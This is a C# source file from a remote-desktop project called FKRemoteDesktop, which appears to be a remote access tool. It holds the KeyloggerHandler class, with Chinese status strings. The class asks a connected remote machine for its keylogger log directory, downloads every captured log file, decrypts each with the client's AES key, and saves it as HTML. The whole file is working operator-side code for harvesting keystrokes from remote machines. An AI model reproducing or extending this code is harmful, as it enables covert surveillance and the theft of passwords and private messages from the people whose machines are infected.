using FKRemoteDesktop.Helpers;
using FKRemoteDesktop.Message.MessageStructs;
using FKRemoteDesktop.Message.SubMessages;
using FKRemoteDesktop.Network;
using FKRemoteDesktop.Structs;
using System;
using System.IO;
//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Message.SubMessageHandler
{
    public class KeyloggerHandler : MessageProcessorBase<string>, IDisposable
    {
        private readonly Client _client;
        private readonly FileManagerHandler _fileManagerHandler;
        private string _remoteKeyloggerDirectory;
        private int _allTransfers;
        private int _completedTransfers;

        public KeyloggerHandler(Client client) : base(true)
        {
            _client = client;
            _fileManagerHandler = new FileManagerHandler(client, "Logs\\");
            _fileManagerHandler.DirectoryChanged += DirectoryChanged;
            _fileManagerHandler.FileTransferUpdated += FileTransferUpdated;
            _fileManagerHandler.ProgressChanged += StatusUpdated;
            MessageHandler.Register(_fileManagerHandler);
        }

        public override bool CanExecute(IMessage message) => message is GetKeyloggerLogsDirectoryResponse;

        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetKeyloggerLogsDirectoryResponse logsDirectory:
                    Execute(sender, logsDirectory);
                    break;
            }
        }

        public void RetrieveLogs()
        {
            _client.Send(new GetKeyloggerLogsDirectory());
        }

        private void Execute(ISender client, GetKeyloggerLogsDirectoryResponse message)
        {
            _remoteKeyloggerDirectory = message.LogsDirectory;
            client.Send(new GetDirectory { RemotePath = _remoteKeyloggerDirectory });
        }

        private string GetDownloadProgress(int allTransfers, int completedTransfers)
        {
            decimal progress = Math.Round((decimal)((double)completedTransfers / (double)allTransfers * 100.0), 2);
            return $"下载中...({progress}%)";
        }

        private void StatusUpdated(object sender, string value)
        {
            OnReport($"未能找到Log文件 ({value})");
        }

        private void DirectoryChanged(object sender, string remotePath, FileSystemEntry[] items)
        {
            if (items.Length == 0)
            {
                OnReport("未能找到Log文件");
                return;
            }

            _allTransfers = items.Length;
            _completedTransfers = 0;
            OnReport(GetDownloadProgress(_allTransfers, _completedTransfers));

            foreach (var item in items)
            {
                if (FileHelper.HasIllegalCharacters(item.Name))
                {
                    _client.Disconnect();
                    return;
                }
                _fileManagerHandler.BeginDownloadFile(Path.Combine(_remoteKeyloggerDirectory, item.Name), item.Name + ".html", true);
            }
        }

        private void FileTransferUpdated(object sender, SFileTransfer transfer)
        {
            if (transfer.Status == "传输完成")
            {
                try
                {
                    _completedTransfers++;
                    File.WriteAllText(transfer.LocalPath, FileHelper.ReadLogFile(transfer.LocalPath, _client.UserInfo.AesInstance));
                    OnReport(_allTransfers == _completedTransfers
                        ? "成功下载全部日志文件"
                        : GetDownloadProgress(_allTransfers, _completedTransfers));
                }
                catch (Exception ex)
                {
                    OnReport("解密键盘日志文件并写入失败:" + ex.Message);
                }
            }
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                MessageHandler.Unregister(_fileManagerHandler);
                _fileManagerHandler.ProgressChanged -= StatusUpdated;
                _fileManagerHandler.FileTransferUpdated -= FileTransferUpdated;
                _fileManagerHandler.DirectoryChanged -= DirectoryChanged;
                _fileManagerHandler.Dispose();
            }
        }
    }
}
